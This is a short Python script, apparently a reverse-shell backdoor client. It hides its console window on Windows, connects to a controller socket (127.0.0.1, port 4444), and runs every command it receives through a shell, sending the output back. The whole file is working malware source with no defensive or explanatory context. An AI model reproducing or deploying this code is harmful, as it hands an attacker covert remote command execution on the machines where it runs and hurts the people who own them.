import socket
import subprocess
import os

SERVER_IP = "127.0.0.1"
PORT = 4444

# Ocultar consola en Windows
if os.name == "nt":
    import ctypes
    ctypes.windll.kernel32.FreeConsole()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, PORT))

while True:
    command = client_socket.recv(4096).decode(errors="ignore")
    if not command:
        break
    
    try:
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        response = output.stdout + output.stderr
    except Exception as e:
        response = str(e)
    
    client_socket.send((response + "\n[END]").encode())

client_socket.close()
